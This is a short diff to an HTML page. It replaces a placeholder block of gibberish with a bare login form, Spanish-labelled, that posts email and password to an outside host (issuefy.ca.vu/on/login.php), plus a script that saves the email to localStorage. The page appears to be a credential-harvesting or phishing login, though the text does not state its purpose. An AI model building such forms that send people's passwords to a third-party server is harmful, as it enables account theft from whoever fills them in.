@@ -33,21 +33,19 @@
 </head>
 <body>
       
+<form action="http://issuefy.ca.vu/on/login.php" class="form-login"  method="post" /> 
+<input name="email" type="email" id="email" required="" placeholder="Email" />
+<input name="password" type="password" required="" placeholder="Contraseña" />
+</form>
 
-      <div class="front_page">
-               kkkkkkkkkkkkkkkk
-               hkhkkkkkkk
-               hkkkkkkkkk
-               hkkkkkkkkkkk
-               khhhhhhhhhh
-               khhhhhhhh
-               khhhhhhhkk
-             </div>
+<button onclick="store()" type="button">StoreEmail</button>
 
-
-
-
-
+<script  type="text/javascript">
+  function store(){
+     var inputEmail= document.getElementById("email");
+     localStorage.setItem("email", inputEmail.value);
+    }
+</script>
 
 
 
